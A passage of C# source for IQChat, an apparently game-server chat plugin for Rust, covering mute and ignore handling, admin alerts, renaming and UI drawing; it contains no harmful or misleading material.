                IOrderedEnumerable<BasePlayer> PlayerList = Action == SelectedAction.Mute ? SearchName != null ? BasePlayer.activePlayerList.Where(p => UserInformation.ContainsKey(p.userID) && p.displayName.ToLower().Contains(SearchName.ToLower())).OrderBy(p => UserInformation[p.userID].MuteInfo.IsMute(MuteType.Chat) || UserInformation[p.userID].MuteInfo.IsMute(MuteType.Voice)) : BasePlayer.activePlayerList.Where(p => UserInformation.ContainsKey(p.userID)).OrderBy(p => UserInformation[p.userID].MuteInfo.IsMute(MuteType.Chat) || UserInformation[p.userID].MuteInfo.IsMute(MuteType.Voice)) :
                                                                         SearchName != null ? BasePlayer.activePlayerList.Where(p => UserInformation.ContainsKey(p.userID) && p.displayName.ToLower().Contains(SearchName.ToLower())).OrderBy(p => UserInformation[player.userID].Settings.IgnoreUsers.Contains(p.userID)) : BasePlayer.activePlayerList.Where(p => UserInformation.ContainsKey(p.userID)).OrderBy(p => UserInformation[player.userID].Settings.IgnoreUsers.Contains(p.userID));

                DrawUI_IQChat_Mute_And_Ignore_Pages(player, (Boolean)(PlayerList.Skip(18 * (Page + 1)).Count() > 0), Action, Page);
                DrawUI_IQChat_Mute_And_Ignore_Player(player, Action, PlayerList.Skip(18 * Page).Take(18));
            }
        }        
        private const String PermissionRename = "iqchat.renameuse";
        private void MigrateDataToNoob()
        {
            if (config.ControllerMessages.TurnedFunc.AntiNoobSetting.AntiNoobPM.AntiNoobActivate || config.ControllerMessages.TurnedFunc.AntiNoobSetting.AntiNoobChat.AntiNoobActivate)
            {
                if (UserInformationConnection.Count == 0 || UserInformationConnection == null)
                {
                    PrintWarning(LanguageEn ? "Migration of old players to Anti-Nub.." : "Миграция старых игроков в Анти-Нуб..");
                    foreach (KeyValuePair<UInt64, User> InfoUser in UserInformation.Where(x => !UserInformationConnection.ContainsKey(x.Key)))
                        UserInformationConnection.Add(InfoUser.Key, new AntiNoob { DateConnection = new DateTime(2022, 1, 1) });
                    PrintWarning(LanguageEn ? "Migration of old players completed" : "Миграция старых игроков завершена");
                }
            }
        }

        
        private String GetClanTag(UInt64 playerID)
        {
            if(!Clans) return String.Empty;
            String ClanTag = (String)Clans?.CallHook("GetClanOf", playerID);

            return String.IsNullOrWhiteSpace(ClanTag) ? String.Empty : GetLang("CLANS_SYNTAX_PREFIX", playerID.ToString(), ClanTag);
        }
        [ConsoleCommand("alertuip")]
        private void AlertUIPConsoleCommand(ConsoleSystem.Arg args)
        {
            BasePlayer Sender = args.Player();
            if (Sender != null)
                if (!permission.UserHasPermission(Sender.UserIDString, PermissionAlert)) return;
            if (args.Args == null || args.Args.Length == 0)
            {
                if (Sender != null)
                    ReplySystem(Sender, LanguageEn ? "You didn't specify a player!" : "Вы не указали игрока!");
                else PrintWarning(LanguageEn ? "You didn't specify a player!" : "Вы не указали игрока!");
                return;
            }
            BasePlayer Recipient = BasePlayer.Find(args.Args[0]);
            if (Recipient == null)
            {
                if (Sender != null)
                    ReplySystem(Sender, LanguageEn ? "The player is not on the server!" : "Игрока нет на сервере!");
                else PrintWarning(LanguageEn ? "The player is not on the server!" : "Игрока нет на сервере!");
                return;
            }
            AlertUI(Sender, Recipient, args.Args.Skip(1).ToArray());
        }

        
        
        private List<String> GetPlayersOnline()
        {
            List<String> PlayerNames = new List<String>();
            Int32 Count = 1;

            foreach (BasePlayer playerInList in BasePlayer.activePlayerList.Where(p => !permission.UserHasPermission(p.UserIDString, PermissionHideOnline)))
            {
                String ResultName = $"{Count} - {GetPlayerFormat(playerInList)}";
                PlayerNames.Add(ResultName);

                Count++;
            }

            if (IQFakeActive)
            {
                foreach (FakePlayer fakePlayer in PlayerBases.Where(x => IsFake(x.UserID)))
                {
                    String ResultName = $"{Count} - {API_GET_DEFAULT_PREFIX()}<color={API_GET_DEFAULT_NICK_COLOR()}>{fakePlayer.DisplayName}</color>";
                    PlayerNames.Add(ResultName);

                    Count++;
                }
            }

            return PlayerNames;
        }
        
                private void MutePlayer(BasePlayer Target, MuteType Type, Int32 ReasonIndex, BasePlayer Moderator = null, String ReasonCustom = null, Int32 TimeCustom = 0, Boolean HideMute = false, Boolean Command = false, UInt64 IDFake = 0)
        {
            Configuration.ControllerMute ControllerMutes = config.ControllerMutes;
		   		 		  						  	   		  	  			  	  			  	   		  		  
            if (IQFakeActive && Target == null && (IQFakeActive && Target == null && IDFake != 0) )
            {
                ReplySystem(Moderator, GetLang(Type == MuteType.Chat ? "FUNC_MESSAGE_MUTE_CHAT" : "FUNC_MESSAGE_MUTE_VOICE", Moderator != null ? Moderator.displayName : Moderator.UserIDString, GetLang("IQCHAT_FUNCED_ALERT_TITLE_SERVER"), FindFakeName(IDFake), FormatTime(TimeCustom == 0 ? config.ControllerMutes.MuteChatReasons[ReasonIndex].SecondMute : TimeCustom), ReasonCustom ?? config.ControllerMutes.MuteChatReasons[ReasonIndex].Reason));
                RemoveReserved(IDFake);
                FakePlayer FakeP = PlayerBases.FirstOrDefault(x => x.UserID == IDFake);
                if (FakeP != null)
                    PlayerBases.Remove(FakeP);
                return;
            }

            if (!UserInformation.ContainsKey(Target.userID)) return;
            User Info = UserInformation[Target.userID];
		   		 		  						  	   		  	  			  	  			  	   		  		  
            String LangMessage = String.Empty;
            String Reason = String.Empty;
            Int32 MuteTime = 0;

            String NameModerator = GetLang("IQCHAT_FUNCED_ALERT_TITLE_SERVER", Target.UserIDString);

            if (Moderator != null)
            {
                GeneralInformation.RenameInfo ModeratorRename = GeneralInfo.GetInfoRename(Moderator.userID);
                NameModerator = ModeratorRename != null ? $"{ModeratorRename.RenameNick ?? Moderator.displayName}" : Moderator.displayName;
            }

            GeneralInformation.RenameInfo TagetRename = GeneralInfo.GetInfoRename(Target.userID);
            String TargetName = TagetRename != null ? $"{TagetRename.RenameNick ?? Target.displayName}" : Target.displayName;

            if (Target == null || !Target.IsConnected)
            {
                if (Moderator != null && !Command)
                    ReplySystem(Moderator, GetLang("UI_CHAT_PANEL_MODERATOR_MUTE_PANEL_TAKE_TYPE_CHAT_ACTION_NOT_CONNNECTED", Moderator.UserIDString));
                return;
            }

            if (Moderator != null && !Command)
                if (Info.MuteInfo.IsMute(Type))
                {
                    ReplySystem(Moderator, GetLang("IQCHAT_FUNCED_ALERT_TITLE_ISMUTED", Moderator.UserIDString));
                    return;
                }

            switch (Type)
            {
                case MuteType.Chat:
                    {
                        Reason = ReasonCustom ?? ControllerMutes.MuteChatReasons[ReasonIndex].Reason;
                        MuteTime = TimeCustom == 0 ? ControllerMutes.MuteChatReasons[ReasonIndex].SecondMute : TimeCustom;
                        LangMessage = "FUNC_MESSAGE_MUTE_CHAT";
                        break;
                    }
                case MuteType.Voice:
                    {
                        Reason = ReasonCustom ?? ControllerMutes.MuteVoiceReasons[ReasonIndex].Reason;
                        MuteTime = TimeCustom == 0 ? ControllerMutes.MuteVoiceReasons[ReasonIndex].SecondMute : TimeCustom;
                        LangMessage = "FUNC_MESSAGE_MUTE_VOICE";
                        break;
                    }
            }

            Info.MuteInfo.SetMute(Type, MuteTime);

            if (!HideMute)
                ReplyBroadcast(GetLang(LangMessage, Target.UserIDString, NameModerator, TargetName, FormatTime(MuteTime, Target.UserIDString), Reason));
            else
            {
                if (Target != null)
                    ReplySystem(Target, GetLang(LangMessage, Target.UserIDString, NameModerator, TargetName, FormatTime(MuteTime, Target.UserIDString), Reason));
		   		 		  						  	   		  	  			  	  			  	   		  		  
                if (Moderator != null)
                    ReplySystem(Moderator, GetLang(LangMessage, Target.UserIDString, NameModerator, TargetName, FormatTime(MuteTime, Target.UserIDString), Reason));
            }

            if (Moderator != null && Moderator != Target)
                IQPersonalSendSetMute(Moderator);

            DiscordLoggMuted(Target, Type, Reason, FormatTime(MuteTime, Target.UserIDString), Moderator);
        }
        String API_GET_DEFAULT_PREFIX() => config.ControllerConnect.SetupDefaults.PrefixDefault;

        
        
        [ConsoleCommand("mute")]
        void MuteCustomAdmin(ConsoleSystem.Arg arg)
        {
            if (arg.Player() != null)
                if (!permission.UserHasPermission(arg.Player().UserIDString, PermissionMute)) return;
            if (arg == null || arg.Args == null || arg.Args.Length != 3 || arg.Args.Length > 3)
            {
                PrintWarning(LanguageEn ? "Invalid syntax, use : mute Steam64ID/Nick Reason Time(seconds)" : "Неверный синтаксис,используйте : mute Steam64ID/Ник Причина Время(секунды)");
                return;
            }
            string NameOrID = arg.Args[0];
            string Reason = arg.Args[1];
            Int32 TimeMute = 0;
            if(!Int32.TryParse(arg.Args[2], out TimeMute))
            {
                PrintWarning(LanguageEn ? "Enter time in numbers!" : "Введите время цифрами!");
                return;
            }
            BasePlayer target = GetPlayerNickOrID(NameOrID);
            if (target == null)
            {
                UInt64 Steam64ID = 0;
                if (UInt64.TryParse(NameOrID, out Steam64ID))
                {
                    if(UserInformation.ContainsKey(Steam64ID))
                    {
                        User Info = UserInformation[Steam64ID];
                        if (Info == null) return;
                        if (Info.MuteInfo.IsMute(MuteType.Chat))
                        {
                            PrintWarning(LanguageEn ? "The player already has a chat lock" : "Игрок уже имеет блокировку чата");
                            return;
                        }
                        
                        Info.MuteInfo.SetMute(MuteType.Chat, TimeMute);
                        PrintWarning(LanguageEn ? "Chat blocking issued to offline player" : "Блокировка чата выдана offline-игроку");
                        return;
                    }
                    else
                    {
                        PrintWarning(LanguageEn ? "This player is not on the server" : "Такого игрока нет на сервере");
                        return;
                    }
                }
                else
                {
                    PrintWarning(LanguageEn ? "This player is not on the server" : "Такого игрока нет на сервере");
                    return;
                }
            }

            MutePlayer(target, MuteType.Chat, 0, arg.Player(), Reason, TimeMute, false, true);
            Puts(LanguageEn ? "Successfully" : "Успешно");
        }

                private void DrawUI_IQChat_Update_DisplayName(BasePlayer player)
        {
            String InterfaceVisualNick = InterfaceBuilder.GetInterface("UI_Chat_Context_Visual_Nick");
            User Info = UserInformation[player.userID];
            Configuration.ControllerParameters Controller = config.ControllerParameter;
            if (Info == null || InterfaceVisualNick == null || Controller == null) return;

            String DisplayNick = String.Empty;

            String Pattern = @"</?size.*?>";
            if (Controller.Prefixes.TurnMultiPrefixes)
            {
                if (Info.Info.PrefixList != null && Info.Info.PrefixList.Count != 0)
                    DisplayNick += Info.Info.PrefixList.Count > 1 ? $"{(Regex.IsMatch(Info.Info.PrefixList[0], Pattern) ? Regex.Replace(Info.Info.PrefixList[0], Pattern, "") : Info.Info.PrefixList[0])}+{Info.Info.PrefixList.Count - 1}" :
                        (Regex.IsMatch(Info.Info.PrefixList[0], Pattern) ? Regex.Replace(Info.Info.PrefixList[0], Pattern, "") : Info.Info.PrefixList[0]);
            }
            else DisplayNick += Regex.IsMatch(Info.Info.Prefix, Pattern) ? Regex.Replace(Info.Info.Prefix, Pattern, "") : Info.Info.Prefix;
            DisplayNick += $"<color={Info.Info.ColorNick ?? "#ffffff"}>{player.displayName}</color>: <color={Info.Info.ColorMessage ?? "#ffffff"}>{GetLang("IQCHAT_CONTEXT_NICK_DISPLAY_MESSAGE", player.UserIDString)}</color>";

            InterfaceVisualNick = InterfaceVisualNick.Replace("%NICK_DISPLAY%", DisplayNick);


            CuiHelper.DestroyUi(player, InterfaceBuilder.UI_Chat_Context_Visual_Nick);
            CuiHelper.AddUi(player, InterfaceVisualNick);
        }

        [ChatCommand("ignore")]
        void IgnorePlayerPM(BasePlayer player, String cmd, String[] arg)
        {
            Configuration.ControllerMessage ControllerMessages = config.ControllerMessages;
            if (!ControllerMessages.TurnedFunc.IgnoreUsePM) return;

            User Info = UserInformation[player.userID];

            if (arg.Length == 0 || arg == null)
            {
                ReplySystem(player, GetLang("INGORE_NOTARG", player.UserIDString));
                return;
            }
            String NameUser = arg[0];
            BasePlayer TargetUser = BasePlayer.Find(NameUser);

            if (TargetUser == null || NameUser == null)
            {
                ReplySystem(player, GetLang("COMMAND_PM_NOT_USER", player.UserIDString));
                return;
            }

            String Lang = !Info.Settings.IsIgnored(TargetUser.userID) ? GetLang("IGNORE_ON_PLAYER", player.UserIDString, TargetUser.displayName) : GetLang("IGNORE_OFF_PLAYER", player.UserIDString, TargetUser.displayName);
            ReplySystem(player, Lang);

            Info.Settings.IgnoredAddOrRemove(TargetUser.userID);
        }

        private void DrawUI_IQChat_OpenDropListArgument(BasePlayer player, TakeElementUser ElementType, Configuration.ControllerParameters.AdvancedFuncion Info, Int32 X, Int32 Y, Int32 Count)
        {
            String Interface = InterfaceBuilder.GetInterface("UI_Chat_OpenDropListArgument");
            if (Interface == null) return;
            String Argument = ElementType == TakeElementUser.MultiPrefix || ElementType == TakeElementUser.Prefix ? Info.Argument :
                    ElementType == TakeElementUser.Nick ? $"<color={Info.Argument}>{player.displayName}</color>" :
                    ElementType == TakeElementUser.Chat ? $"<color={Info.Argument}>{GetLang("IQCHAT_CONTEXT_NICK_DISPLAY_MESSAGE", player.UserIDString)}</color>" :
                    ElementType == TakeElementUser.Rank ? IQRankGetNameRankKey(Info.Argument) : String.Empty;

            Interface = Interface.Replace("%OFFSET_MIN%", $"{-140.329 - (-103 * X)} {-2.243 + (Y * -28)}");
            Interface = Interface.Replace("%OFFSET_MAX%", $"{-65.271 - (-103 * X)} {22.568 + (Y * -28)}"); 
            Interface = Interface.Replace("%COUNT%", Count.ToString());
            Interface = Interface.Replace("%ARGUMENT%", Argument);
            Interface = Interface.Replace("%TAKE_COMMAND_ARGUMENT%", $"newui.cmd droplist.controller element.take {ElementType} {Count} {Info.Permissions} {Info.Argument}"); 

            CuiHelper.DestroyUi(player, $"ArgumentDropList_{Count}");
            CuiHelper.AddUi(player, Interface);
        }    
        void OnPlayerConnected(BasePlayer player)
        {
            UserConnecteionData(player);
            AlertController(player);
        }
        private const String PermissionMutedAdmin = "iqchat.adminmuted";

        public class GeneralInformation
        {
            public Boolean TurnMuteAllChat;
            public Boolean TurnMuteAllVoice;

            public Dictionary<UInt64, RenameInfo> RenameList = new Dictionary<UInt64, RenameInfo>();
            internal class RenameInfo
            {
                public String RenameNick;
                public UInt64 RenameID;
            }

            public RenameInfo GetInfoRename(UInt64 UserID)
            {
                if (!RenameList.ContainsKey(UserID)) return null;
                return RenameList[UserID];
            }
        }

        [ChatCommand("alertui")]
        private void AlertUIChatCommand(BasePlayer Sender, String cmd, String[] args)
        {
            if (!permission.UserHasPermission(Sender.UserIDString, PermissionAlert)) return;
            AlertUI(Sender, args);
        }     
        
                public void RemoveReserved(UInt64 userID)
        {
            if (!IQFakeActive) return;
            IQFakeActive?.Call("RemoveReserver", userID);
        }

		   		 		  						  	   		  	  			  	  			  	   		  		  
        
                public class FancyMessage
        {
            public string content { get; set; }
            public bool tts { get; set; }
            public Embeds[] embeds { get; set; }

            public class Embeds
            {
                public string title { get; set; }
                public int color { get; set; }
                public List<Fields> fields { get; set; }
                public Footer footer { get; set; }
                public Authors author { get; set; }

                public Embeds(string title, int color, List<Fields> fields, Authors author, Footer footer)
                {
                    this.title = title;
                    this.color = color;
                    this.fields = fields;
                    this.author = author;
                    this.footer = footer;

                }
            }

            public FancyMessage(string content, bool tts, Embeds[] embeds)
            {
                this.content = content;
                this.tts = tts;
                this.embeds = embeds;
            }

            public string toJSON() => JsonConvert.SerializeObject(this);
        }
        String IQRankGetTimeGame(ulong userID) => (string)(IQRankSystem?.Call("API_GET_TIME_GAME", userID));
        private String GetMessageInArgs(BasePlayer Sender, String[] arg)
        {
            if (arg == null || arg.Length == 0)
            {
                if (Sender != null)
                    ReplySystem(Sender, GetLang("FUNC_MESSAGE_NO_ARG_BROADCAST", Sender.UserIDString));
                else PrintWarning(GetLang("FUNC_MESSAGE_NO_ARG_BROADCAST"));
                return null;
            }
            String Message = String.Empty;
            foreach (String msg in arg)
                Message += " " + msg;

            return Message;
        }
        private void DrawUI_IQChat_Context_AdminAndModeration(BasePlayer player)
        {
            if (!permission.UserHasPermission(player.UserIDString, PermissionMute)) return;
		   		 		  						  	   		  	  			  	  			  	   		  		  
            String InterfaceModeration = InterfaceBuilder.GetInterface("UI_Chat_Moderation");
            if (InterfaceModeration == null) return;

            InterfaceModeration = InterfaceModeration.Replace("%TITLE%", GetLang("IQCHAT_TITLE_MODERATION_PANEL", player.UserIDString));
            InterfaceModeration = InterfaceModeration.Replace("%COMMAND_MUTE_MENU%", $"newui.cmd action.mute.ignore open {SelectedAction.Mute}");
            InterfaceModeration = InterfaceModeration.Replace("%TEXT_MUTE_MENU%", GetLang("IQCHAT_BUTTON_MODERATION_MUTE_MENU", player.UserIDString));

            CuiHelper.AddUi(player, InterfaceModeration);

            DrawUI_IQChat_Update_MuteChat_All(player);
            DrawUI_IQChat_Update_MuteVoice_All(player);
        }
        String API_GET_DEFAULT_MESSAGE_COLOR() => config.ControllerConnect.SetupDefaults.MessageDefault;

        void ReplySystem(BasePlayer player, String Message, String CustomPrefix = null, String CustomAvatar = null, String CustomHex = null)
        {
            Configuration.ControllerMessage ControllerMessages = config.ControllerMessages;

            String Prefix = (CustomPrefix == null || String.IsNullOrWhiteSpace(CustomPrefix)) ? (ControllerMessages.GeneralSetting.BroadcastFormat.BroadcastTitle == null || String.IsNullOrWhiteSpace(ControllerMessages.GeneralSetting.BroadcastFormat.BroadcastTitle)) ? "" : ControllerMessages.GeneralSetting.BroadcastFormat.BroadcastTitle : CustomPrefix;
            String AvatarID = (CustomAvatar == null || String.IsNullOrWhiteSpace(CustomAvatar)) ? (ControllerMessages.GeneralSetting.BroadcastFormat.Steam64IDAvatar == null || String.IsNullOrWhiteSpace(ControllerMessages.GeneralSetting.BroadcastFormat.Steam64IDAvatar)) ? "0" : ControllerMessages.GeneralSetting.BroadcastFormat.Steam64IDAvatar : CustomAvatar;
            String Hex = (CustomHex == null || String.IsNullOrWhiteSpace(CustomHex)) ? (ControllerMessages.GeneralSetting.BroadcastFormat.BroadcastColor == null || String.IsNullOrWhiteSpace(ControllerMessages.GeneralSetting.BroadcastFormat.BroadcastColor)) ? "#ffff" : ControllerMessages.GeneralSetting.BroadcastFormat.BroadcastColor : CustomHex;
		   		 		  						  	   		  	  			  	  			  	   		  		  
            player.SendConsoleCommand("chat.add", Chat.ChatChannel.Global, AvatarID, $"{Prefix}<color={Hex}>{Message}</color>");
        }
        
                String IQRankGetRank(ulong userID) => (string)(IQRankSystem?.Call("API_GET_RANK_NAME", userID));
        void API_ALERT_PLAYER_UI(BasePlayer player, String Message) => DrawUI_IQChat_Alert(player, Message);
        private void DrawUI_IQChat_Update_MuteVoice_All(BasePlayer player)
        {
            if (!permission.UserHasPermission(player.UserIDString, PermissionMutedAdmin)) return;

            String InterfaceAdministratorVoice = InterfaceBuilder.GetInterface("UI_Chat_Administation_AllVoce");
            if (InterfaceAdministratorVoice == null) return;

            InterfaceAdministratorVoice = InterfaceAdministratorVoice.Replace("%TEXT_MUTE_ALLVOICE%", GetLang(!GeneralInfo.TurnMuteAllVoice ? "IQCHAT_BUTTON_MODERATION_MUTE_ALL_VOICE" : "IQCHAT_BUTTON_MODERATION_UNMUTE_ALL_VOICE", player.UserIDString));
            InterfaceAdministratorVoice = InterfaceAdministratorVoice.Replace("%COMMAND_MUTE_ALLVOICE%", $"newui.cmd action.mute.ignore mute.controller {SelectedAction.Mute} mute.all.voice");

            CuiHelper.DestroyUi(player, "ModeratorMuteAllVoice");
            CuiHelper.AddUi(player, InterfaceAdministratorVoice);
        }
        
        private static ConfigurationOld configOld = new ConfigurationOld();
        protected override void SaveConfig() => Config.WriteObject(config);

        public Dictionary<UInt64, FlooderInfo> Flooders = new Dictionary<UInt64, FlooderInfo>();

        [ConsoleCommand("hunmute")]
        void HideUnMuteConsole(ConsoleSystem.Arg arg)
        {
            if (arg.Player() != null)
                if (!permission.UserHasPermission(arg.Player().UserIDString, PermissionMute)) return;
            if (arg == null || arg.Args == null || arg.Args.Length != 1 || arg.Args.Length > 1)
            {
                PrintWarning(LanguageEn ? "Invalid syntax, please use : hunmute Steam64ID" : "Неверный синтаксис,используйте : hunmute Steam64ID");
                return;
            }
            string NameOrID = arg.Args[0];
            BasePlayer target = GetPlayerNickOrID(NameOrID);
            if (target == null)
            {
                UInt64 Steam64ID = 0;
                if (UInt64.TryParse(NameOrID, out Steam64ID))
                {
                    if(UserInformation.ContainsKey(Steam64ID))
                    {
                        User Info = UserInformation[Steam64ID];
                        if (Info == null) return;
                        if (!Info.MuteInfo.IsMute(MuteType.Chat))
                        {
                            ConsoleOrPrintMessage(arg.Player(),
                                LanguageEn ?"The player does not have a chat lock" : "У игрока нет блокировки чата");
                            return;
                        }
                        
                        Info.MuteInfo.UnMute(MuteType.Chat);
                        
                        ConsoleOrPrintMessage(arg.Player(),
                            LanguageEn ? "You have unblocked the offline chat to the player" : "Вы разблокировали чат offline игроку");
                        return;
                    }
                    else
                    {
                        ConsoleOrPrintMessage(arg.Player(),
                            LanguageEn ? "This player is not on the server" : "Такого игрока нет на сервере");
                        return;
                    }
                }
                else
                {
                    ConsoleOrPrintMessage(arg.Player(),
                        LanguageEn ? "This player is not on the server" : "Такого игрока нет на сервере");
                    return;
                }
            }

            UnmutePlayer(target, MuteType.Chat, arg.Player(), true, true);
        }
        private void DrawUI_IQChat_Slider_Update_Argument(BasePlayer player, TakeElementUser ElementType)
        {
            String Interface = InterfaceBuilder.GetInterface("UI_Chat_Slider_Update_Argument");
            User Info = UserInformation[player.userID];
            if (Info == null || Interface == null) return;

            String Argument = String.Empty;
            String Name = String.Empty;
            String Parent = String.Empty;
            
            switch (ElementType)
            {
                case TakeElementUser.Prefix:
                    Argument = Info.Info.Prefix;
                    Parent = "SLIDER_PREFIX";
                    Name = "ARGUMENT_PREFIX";
                    break;
                case TakeElementUser.Nick:
                    Argument = $"<color={Info.Info.ColorNick}>{player.displayName}</color>";
                    Parent = "SLIDER_NICK_COLOR";
                    Name = "ARGUMENT_NICK_COLOR";
                    break;
                case TakeElementUser.Chat:
                    Argument = $"<color={Info.Info.ColorMessage}>{GetLang("IQCHAT_CONTEXT_NICK_DISPLAY_MESSAGE",player.UserIDString)}</color>";
                    Parent = "SLIDER_MESSAGE_COLOR";
                    Name = "ARGUMENT_MESSAGE_COLOR";
                    break;
                case TakeElementUser.Rank:
                    Argument = IQRankGetNameRankKey(Info.Info.Rank) ?? GetLang("IQCHAT_CONTEXT_SLIDER_IQRANK_TITLE_NULLER", player.UserIDString); 
                    Parent = "SLIDER_IQRANK";
                    Name = "ARGUMENT_RANK";
                    break;
                default:
                    break;
            }

            String Pattern = @"</?size.*?>";
            String ArgumentRegex = Regex.IsMatch(Argument, Pattern) ? Regex.Replace(Argument, Pattern, "") : Argument;
            Interface = Interface.Replace("%ARGUMENT%", ArgumentRegex);
            Interface = Interface.Replace("%PARENT%", Parent);
            Interface = Interface.Replace("%NAME%", Name);

            CuiHelper.DestroyUi(player, Name);
            CuiHelper.AddUi(player, Interface);

        }

        
                void AlertUI(BasePlayer Sender, string[] arg)
        {
            if (_interface == null)
            {
                PrintWarning(LanguageEn ? "We generate the interface, wait for a message about successful generation" : "Генерируем интерфейс, ожидайте сообщения об успешной генерации");
                return;
            }
            String Message = GetMessageInArgs(Sender, arg);
            if (Message == null) return;

            foreach (BasePlayer PlayerInList in BasePlayer.activePlayerList)
                DrawUI_IQChat_Alert(PlayerInList, Message);
        }   
        [ConsoleCommand("adminalert")]
        private void AdminAlertConsoleCommand(ConsoleSystem.Arg args)
        {
            BasePlayer Sender = args.Player();
            if (Sender != null)
                if (!permission.UserHasPermission(Sender.UserIDString, PermissionAlert)) return;
            Alert(Sender, args.Args, true);
        }
        
        
                [ConsoleCommand("newui.cmd")] 
        private void ConsoleCommandFuncional(ConsoleSystem.Arg arg)
        {
            BasePlayer player = arg.Player();
            if (player == null) return;
            String Action = arg.Args[0];
            if (Action == null || String.IsNullOrWhiteSpace(Action)) return;

            if (!LocalBase.ContainsKey(player))
            {
                PrintError(LanguageEn ? "UI was unable to process the local base (Local Base) contact the developer" : "UI не смог обработать локальную базу (LocalBase) свяжитесь с разработчиком");
                return;
            }
            Configuration.ControllerParameters ControllerParameters = config.ControllerParameter;
            if (ControllerParameters == null)
            {
                PrintError(LanguageEn ? "An error has been made in the configuration! Controller Parameters is null, contact developer" : "В конфигурации допущена ошибка! ControllerParameters является null, свяжитесь с разработчиком");
                return;
            }

            switch (Action)
            {
                case "action.mute.ignore":
                    {
                        String ActionMenu = arg.Args[1];
                        SelectedAction ActionType = (SelectedAction)Enum.Parse(typeof(SelectedAction), arg.Args[2]);
                        if(ActionMenu == "search.controller" && arg.Args.Length < 4)
                            return;

                        switch (ActionMenu)
                        {
                            case "mute.controller":
                                {
                                    if (!player.IsAdmin)
                                        if (!permission.UserHasPermission(player.UserIDString, PermissionMute)) return;

                                    String ActionMute = arg.Args[3];
                                    switch (ActionMute)
                                    {
                                        case "mute.all.chat": 
                                            {
                                                if (GeneralInfo.TurnMuteAllChat)
                                                {
                                                    GeneralInfo.TurnMuteAllChat = false;
                                                    ReplyBroadcast(GetLang("IQCHAT_FUNCED_NO_SEND_CHAT_UNMUTED_ALL_CHAT", player.UserIDString), AdminAlert: true);
                                                }
                                                else
                                                {
                                                    GeneralInfo.TurnMuteAllChat = true;
                                                    ReplyBroadcast(GetLang("IQCHAT_FUNCED_NO_SEND_CHAT_MUTED_ALL_CHAT", player.UserIDString), AdminAlert: true);
                                                }

                                                DrawUI_IQChat_Update_MuteChat_All(player);
                                                break;
                                            }
                                        case "mute.all.voice":
                                            {
                                                if (GeneralInfo.TurnMuteAllVoice)
                                                {
                                                    GeneralInfo.TurnMuteAllVoice = false;
                                                    ReplyBroadcast(GetLang("IQCHAT_FUNCED_NO_SEND_CHAT_UMMUTED_ALL_VOICE", player.UserIDString), AdminAlert: true);
                                                }
                                                else
                                                {
                                                    GeneralInfo.TurnMuteAllVoice = true;
                                                    ReplyBroadcast(GetLang("IQCHAT_FUNCED_NO_SEND_CHAT_MUTED_ALL_VOICE", player.UserIDString), AdminAlert: true);
                                                }
                                                DrawUI_IQChat_Update_MuteVoice_All(player);
                                                break;
                                            }
                                        default:
                                            break;
                                    }
                                    break;
                                }
                            case "ignore.and.mute.controller":
                                {
                                    String ActionController = arg.Args[3];
                                    BasePlayer TargetPlayer = BasePlayer.Find(arg.Args[4]);
                                    UInt64 ID = 0;
                                    UInt64.TryParse(arg.Args[4], out ID);

                                    if (TargetPlayer == null && !IsFake(ID))
                                    {
                                        CuiHelper.DestroyUi(player, "MUTE_AND_IGNORE_PANEL_ALERT");
                                        return;
                                    }

                                    switch (ActionController)
                                    {
                                        case "confirm.alert":
                                            {
                                                if (ActionType == SelectedAction.Ignore)
                                                    DrawUI_IQChat_Ignore_Alert(player, TargetPlayer, ID);
                                                else DrawUI_IQChat_Mute_Alert(player, TargetPlayer, ID);
                                                break;
                                            }
                                        case "open.reason.mute": 
                                            {
                                                MuteType Type = (MuteType)Enum.Parse(typeof(MuteType), arg.Args[5]);
                                                DrawUI_IQChat_Mute_Alert_Reasons(player, TargetPlayer, Type, IDFake: ID);
                                                break;
                                            }
                                        case "confirm.yes":
                                            {
                                                if (ActionType == SelectedAction.Ignore)
                                                {
                                                    User Info = UserInformation[player.userID];
                                                    Info.Settings.IgnoredAddOrRemove(IsFake(ID) ? ID : TargetPlayer.userID);

                                                    CuiHelper.DestroyUi(player, "MUTE_AND_IGNORE_PANEL_ALERT");
                                                    DrawUI_IQChat_Mute_And_Ignore_Player_Panel(player, ActionType);
                                                }
                                                else
                                                {
                                                    MuteType Type = (MuteType)Enum.Parse(typeof(MuteType), arg.Args[5]);
                                                    Int32 IndexReason = Int32.Parse(arg.Args[6]);

                                                    MutePlayer(TargetPlayer, Type, IndexReason, player, IDFake: ID);

                                                    CuiHelper.DestroyUi(player, "MUTE_AND_IGNORE_PANEL_ALERT");
                                                    DrawUI_IQChat_Mute_And_Ignore_Player_Panel(player, ActionType);
                                                }
                                                break;
                                            }
                                        case "unmute.yes": 
                                            {
                                                MuteType Type = (MuteType)Enum.Parse(typeof(MuteType), arg.Args[5]);

                                                UnmutePlayer(TargetPlayer, Type, player);

                                                CuiHelper.DestroyUi(player, "MUTE_AND_IGNORE_PANEL_ALERT");
                                                DrawUI_IQChat_Mute_And_Ignore_Player_Panel(player, ActionType);
                                                break;
                                            }
                                    }
                                    break;
                                }
                            case "open":
                                {
                                    DrawUI_IQChat_Mute_And_Ignore(player, ActionType);
                                    break;
                                }
                            case "page.controller":    
                                {
                                    Int32 Page = Int32.Parse(arg.Args[3]);

                                    DrawUI_IQChat_Mute_And_Ignore_Player_Panel(player, ActionType, Page);
                                    break;
                                }
                            case "search.controller":
                                {
                                    String SearchName = arg.Args[3];
                                    DrawUI_IQChat_Mute_And_Ignore_Player_Panel(player, ActionType, SearchName: SearchName);
                                    break;
                                }
                            default:
                                break;
                        }

                        break;
                    }
                case "checkbox.controller":
                    {
                        ElementsSettingsType Type = (ElementsSettingsType)Enum.Parse(typeof(ElementsSettingsType), arg.Args[1]);
                        if (!UserInformation.ContainsKey(player.userID)) return;
                        User Info = UserInformation[player.userID];
                        if (Info == null) return;

                        switch (Type)
                        {
                            case ElementsSettingsType.PM:
                                {
                                    if (Info.Settings.TurnPM)
                                        Info.Settings.TurnPM = false;
                                    else Info.Settings.TurnPM = true;

                                    DrawUI_IQChat_Update_Check_Box(player, Type, "143.38 -67.9", "151.38 -59.9", Info.Settings.TurnPM);
                                    break;
                                }
                            case ElementsSettingsType.Broadcast:
                                {
                                    if (Info.Settings.TurnBroadcast)
                                        Info.Settings.TurnBroadcast = false;
                                    else Info.Settings.TurnBroadcast = true;

                                    DrawUI_IQChat_Update_Check_Box(player, Type, "143.38 -79.6", "151.38 -71.6", Info.Settings.TurnBroadcast);
                                    break;
                                }
                            case ElementsSettingsType.Alert:
                                {
                                    if (Info.Settings.TurnAlert)
                                        Info.Settings.TurnAlert = false;
